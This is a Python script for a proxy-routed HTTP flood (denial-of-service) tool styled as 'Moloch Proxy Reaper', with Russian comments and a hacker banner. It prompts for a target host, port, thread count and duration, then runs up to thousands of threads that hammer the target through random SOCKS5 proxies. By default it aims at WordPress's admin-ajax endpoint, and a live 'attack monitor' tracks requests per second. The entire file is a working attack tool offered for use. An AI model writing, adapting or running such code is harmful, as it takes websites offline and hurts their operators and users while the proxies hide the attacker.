import socket, random, threading, sys, time, os, ssl

# Авто-установка зависимостей
try:
    import socks
except ImportError:
    os.system('pip install PySocks')
    import socks

try:
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.panel import Panel
    from rich.align import Align
except ImportError:
    os.system('pip install rich')
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.panel import Panel
    from rich.align import Align

console = Console()

# --- ГЛОБАЛЬНАЯ СТАТИСТИКА ---
stats = {
    "sent": 0,
    "success": 0,
    "errors": 0,
    "proxies_count": 0,
    "start_time": time.time()
}

def typing_effect(text, style="white", speed=0.03):
    """Эффект печати текста (Mr. Robot Style)"""
    for char in text:
        console.print(char, style=style, end="")
        time.sleep(speed)
    print()

def get_banner():
    return """[bold red]
     ;::::; 
           ;::::; :; 
         ;:::::'   :; 
        ;:::::;     ;. 
       ,:::::'       ;           OOO\\ 
       ::::::;       ;          OOOOO\\ 
       ;:::::;       ;         OOOOOOOO 
      ,;::::::;     ;'         / OOOOOOO 
    ;:::::::::`. ,,,;.        /  / DOOOOOO 
  .';:::::::::::::::::;,     /  /     DOOOO 
,::::::;::::::;;;;::::;,   /  /        DOOO 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO 
::`:::::::`;:::::::: ;::::# /              DOO 
`:`:::::::`;:::::: ;::::::#/               DOO 
:::`:::::::`;; ;:::::::::##                OO 
::::`:::::::`;::::::::;:::#                OO 
`:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:# 
   ::::::`:::::;'  /  /   `#
    [white]──╼ [[ CRAFTED BY: M O L O C H ]] ╾──[/white]
    [red]──╼ [[ MODE: PROXY REAPER v2.1 ACTIVE ]] ╾──[/red]
    [/bold red]"""

def load_proxies():
    if os.path.exists("proxies.txt"):
        with open("proxies.txt", "r", encoding="utf-8") as f:
            proxies = f.read().splitlines()
            proxies = [p for p in proxies if ":" in p]
            stats["proxies_count"] = len(proxies)
            return proxies
    return []

def make_stats_table():
    table = Table(title="[bold red]MOLOCH ATTACK MONITOR[/bold red]", border_style="red")
    table.add_column("METRIC", style="cyan")
    table.add_column("VALUE", style="bold white")
    
    elapsed = max(1, time.time() - stats["start_time"])
    rps = int(stats["sent"] / elapsed)
    
    table.add_row("Proxies Loaded", str(stats["proxies_count"]))
    table.add_row("Total Packets Sent", str(stats["sent"]))
    table.add_row("Server Responses (OK)", f"[green]{stats['success']}[/green]")
    table.add_row("Connection Drops (KO)", f"[red]{stats['errors']}[/red]")
    table.add_row("Requests Per Second", f"[yellow]{rps}[/yellow]")
    return table

def vector_http(port, host, path, duration, proxy_list):
    timeout = time.time() + duration
    target_path = path if path != "/" else "/wp-admin/admin-ajax.php"
    
    request = (
        f"GET {target_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: Moloch-Reaper/2.1 (Cyber-Audit)\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    
    while time.time() < timeout:
        try:
            proxy_raw = random.choice(proxy_list)
            p_ip, p_port = proxy_raw.split(':')
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, p_ip, int(p_port))
            s.settimeout(5)
            
            if port == 443:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=host)
            
            s.connect((host, port))
            s.send(request.encode())
            stats["sent"] += 1
            if s.recv(1024):
                stats["success"] += 1
            s.close()
        except:
            stats["errors"] += 1
            stats["sent"] += 1

def intro():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print("[bold green][+][/bold green] [white]INITIALIZING REAPER CORE...[/white]")
    time.sleep(0.5)
    typing_effect("[>] Accessing proxy-layer... DONE", style="green", speed=0.02)
    typing_effect("[>] Loading Moloch-Reaper modules... DONE", style="green", speed=0.02)
    console.print("-" * 45, style="red")
    typing_effect("[!] SYSTEM ONLINE. OPERATOR: M O L O C H", style="bold red", speed=0.05)
    console.print("-" * 45, style="red")
    time.sleep(1.5)

def run_attack(proxy_list):
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print(Align.center(get_banner()))
    
    try:
        host = console.input("[bold red][?] TARGET HOST (e.g. lib.ru): [/bold red]").strip()
        if host.lower() == 'exit': return False
        
        port = int(console.input("[bold red][?] PORT (80/443): [/bold red]"))
        path = console.input("[bold red][?] PATH (Enter for default): [/bold red]") or "/"
        threads = int(console.input("[bold red][?] THREADS (100-2000): [/bold red]"))
        dur = int(console.input("[bold red][?] DURATION (SEC): [/bold red]"))

        stats["start_time"] = time.time()
        stats["sent"] = 0
        stats["success"] = 0
        stats["errors"] = 0
        
        console.print(f"\n[bold green][*] DEPLOYING {threads} REAPERS ON {host}...[/bold green]\n")

        for _ in range(threads):
            threading.Thread(target=vector_http, args=(port, host, path, dur, proxy_list), daemon=True).start()

        with Live(make_stats_table(), refresh_per_second=4) as live:
            end_time = time.time() + dur
            while time.time() < end_time:
                live.update(make_stats_table())
                time.sleep(0.25)

        console.print(Panel("[bold green]OPERATION COMPLETE. RETURNING TO TERMINAL...[/bold green]"))
        time.sleep(2)
        return True
    except KeyboardInterrupt:
        return True
    except Exception as e:
        console.print(f"[bold red]CRITICAL ERROR: {e}[/bold red]")
        time.sleep(2)
        return True

if __name__ == "__main__":
    intro()
    proxies = load_proxies()
    while True:
        if not run_attack(proxies):
            break

